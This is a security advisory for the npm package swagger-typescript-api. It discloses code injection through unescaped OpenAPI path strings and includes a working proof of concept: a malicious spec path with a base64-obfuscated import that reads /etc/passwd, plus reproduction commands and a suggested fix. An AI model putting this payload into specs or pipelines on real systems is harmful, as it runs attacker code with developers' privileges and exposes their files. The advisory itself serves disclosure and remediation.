# [H] swagger-typescript-api vulnerable to code injection via unescaped OpenAPI path strings in generated method bodies

## Summary
Severity: High
Advisory: GHSA-w284-33mx-6g9v
CVE: CVE-2026-54666
CWE: CWE-1336, CWE-74, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-29
Source: https://github.com/advisories/GHSA-w284-33mx-6g9v
Type: github-advisory

## Affected
- npm: `swagger-typescript-api` — affected >=0 <13.12.2

## Details
### Summary

`swagger-typescript-api` interpolates OpenAPI path strings (the keys of the `paths` object, e.g. `/users/{id}`) directly into a JavaScript template literal inside the body of every generated API method, without escaping. A spec path containing `${ … }` survives `parseRouteName`'s `{x}` / `:x` rewriter verbatim and lands as live JS-template-literal interpolation inside the generated `path: \`...\`` line. Any consumer who calls the affected generated method evaluates the attacker's expression with full importer privileges — file read/write, exfiltration, etc. The attacker controls the OpenAPI spec (remote URL, third-party / public spec, multi-tenant platform); the victim is whoever runs the generator and uses the resulting client.

### Details

`parseRouteName` (`src/schema-routes/schema-routes.ts:147-189`) preprocesses spec paths by rewriting `{x}` and `:x` path-parameter patterns into `${x}` JS template-literal interpolations:

```ts
const pathParamMatches = (routeName || "").match(
  /({[\w[\\\]^`][-_.\w]*})|(:[\w[\\\]^`][-_.\w]*:?)/g,
);
// ...
return fixedRoute.replace(pathParam.$match, `\${${insertion}}`);
```

The regex only matches `{` followed by word characters (and a closing `}`), or `:` followed by word characters. **It does not strip backticks, `${`, or backslashes.** A spec path containing `${ ATTACKER_EXPRESSION }` survives unchanged.

The resulting `fixedRoute` is passed to the procedure-call template at `templates/default/procedure-call.ejs:96` (and the corresponding `templates/modular/procedure-call.ejs:96`):

```ejs
path: `<%~ path %>`,
```

The `<%~ %>` is Eta's raw, unescaped interpolation. The surrounding backticks make this a JavaScript template literal in the generated source. Anything resembling `${…}` inside the path becomes a live JS expression evaluated when the method's `path` template is evaluated — i.e. at every call to the affected method.

Generated method body for a malicious spec path:

```ts
evilCall: (params: RequestParams = {}) =>
  this.request<void, any>({
    path: `/api/${(async () => {
      // ATTACKER CODE EVALUATED HERE on every call to api.<...>.evilCall()
      // — full Node.js capabilities: dynamic import('node:fs'), child_process,
      //   network egress, environment access, etc.
    })()}/items`,
    method: "GET",
    ...params,
  }),
```

Biome (the codebase's formatter) pretty-prints this multi-line, confirming the output parses as valid TypeScript. esbuild bundles it cleanly.

**Caveat for PoC construction:** the path-param regex matches `:x`, so a literal `:` followed by a word character inside the spec path gets mangled into `${x}`. This affects payloads that need to express `node:fs`. The workaround used in the PoC is `Buffer.from('bm9kZTpmcw==','base64').toString()` — base64 contains no `:`, decodes to `'node:fs'` at runtime, and dodges the rewrite entirely.

### PoC

Self-contained reproducer (`run.sh` runs end-to-end: install pinned package → generate from control + payload → bundle with esbuild → instantiate → call method with stubbed `this.request` so there is no real network egress → check canary) is added in comments. Tested on `swagger-typescript-api@13.12.1` and Node `v24.11.1`.

**Malicious OpenAPI path** (literal string, JSON-encoded in the spec below):

```
/api/${(async()=>{ try { const m=Buffer.from('bm9kZTpmcw==','base64').toString(); const f=await import(m); const d=f.readFileSync('/etc/passwd','utf8'); f.writeFileSync('/tmp/sta_canary',d); } catch(e){} return 'x'; })()}/items
```

**Minimal payload spec:**

```json
{
  "openapi": "3.0.0",
  "info": { "title": "PathPayloadAPI", "version": "1.0.0" },
  "servers": [{ "url": "https://api.example.com" }],
  "paths": {
    "/api/${(async()=>{try{const m=Buffer.from('bm9kZTpmcw==','base64').toString();const f=await import(m);const d=f.readFileSync('/etc/passwd','utf8');f.writeFileSync('/tmp/sta_canary',d);}catch(e){}return 'x';})()}/items": {
      "get": {
        "operationId": "evilCall",
        "responses": { "200": { "description": "OK" } }
      }
    }
  }
}
```

**Steps:**

```bash
npm install swagger-typescript-api@13.12.1 esbuild
node -e "import('swagger-typescript-api').then(m => m.generateApi({
  name: 'Api.ts', output: process.cwd() + '/out',
  input: process.cwd() + '/payload-spec.json', httpClientType: 'fetch'
}))"
npx esbuild out/Api.ts --bundle --format=esm --platform=node \
  --tsconfig-raw='{}' --outfile=out/Api.bundle.mjs
rm -f /tmp/sta_canary
node --input-type=module -e "
  const mod = await import('./out/Api.bundle.mjs');
  const api = new mod.Api();
  // Stub the request implementation so there is no real network call —
  // only the path template literal is evaluated, which is what fires the IIFE.
  api.request = async () => ({ ok: true });
  const group = api.api;
  await group[Object.keys(group)[0]]();
  await new Promise(r => setTimeout(r, 300));
"
ls -la /tmp/sta_canary && cat /tmp/sta_canary
```

**Generated `out/Api.ts` (method body — payload, Biome-formatted):**

```ts
evilCall: (params: RequestParams = {}) =>
  this.request<void, any>({
    path: `/api/${(async () => {
      try {
        const m = Buffer.from("bm9kZTpmcw==", "base64").toString();
        const f = await import(m);
        const d = f.readFileSync("/etc/passwd", "utf8");
        f.writeFileSync("/tmp/sta_canary", d);
      } catch (e) {}
      return "x";
    })()}/items`,
    method: "GET",
    ...params,
  }),
```

The IIFE is a real JavaScript expression inside the `path` template literal — Biome only reformats syntactically valid TS, so the multi-line indented output proves it parsed.

**Result:** after instantiating the generated `Api` and calling the affected method, `/tmp/sta_canary` contains the full `/etc/passwd` of the importing process (1470 bytes on a typical Linux host). Control spec (path `"/api/users/{id}/items"`) generates `path: \`/api/users/${id}/items\``, the IIFE never appears, and the canary is not written.

### Impact

**Type:** Code injection in generated output (CWE-94) / template-engine injection (CWE-1336).

**Affected use cases:** any developer or pipeline that runs `swagger-typescript-api` against an OpenAPI spec they did not author entirely:

- `sta generate --url https://attacker.example/openapi.json` — a public, third-party, or attacker-hosted spec.
- A CI/CD pipeline regenerating clients from a vendor / partner spec on each build.
- A multi-tenant SaaS that generates per-tenant clients from tenant-supplied specs.
- Any project where a contributor can modify the pinned spec via pull request.

**Lifecycle:** the injected expression fires **per method call** — every time a consumer invokes the affected generated method, the path template literal is evaluated and the IIFE runs. Lower severity than module-load sinks because the consumer must actually use the affected method, but this is the entire purpose of a generated API client; any non-trivial use of the client triggers it. Affects both `httpClientType: "fetch"` (default) and `httpClientType: "axios"`, both `default/` and `modular/` template sets — any path-bearing operation in the spec is a candidate.

**Privilege:** the IIFE runs with the full privileges of the calling process — file read/write, network egress, environment access, child-process spawn, etc.

**Suggested fix:** sanitize the path string after `parseRouteName` finishes its `{x}` / `:x` rewrites but before it is interpolated into the template literal. The path should only contain literal URL characters plus the `${name}` interpolations that `parseRouteName` deliberately introduces — any backtick, `${`, or `\` outside those deliberate interpolations should be escaped or rejected. Alternatively, change `templates/default/procedure-call.ejs:96` (and `templates/modular/procedure-call.ejs:96`) to stop wrapping `path` in a backtick literal: emit a string concatenation instead, where path-param substitution is explicit and the rest of the path is treated as inert string data.

Submitted by: Hamza Haroon (thegr1ffyn)

## References
- https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-w284-33mx-6g9v
- https://github.com/acacode/swagger-typescript-api/pull/1779
- https://github.com/acacode/swagger-typescript-api/commit/306d59acb8ffbb00f953f807b97234b21f51d9de
- https://github.com/acacode/swagger-typescript-api
- https://github.com/acacode/swagger-typescript-api/releases/tag/v13.12.2
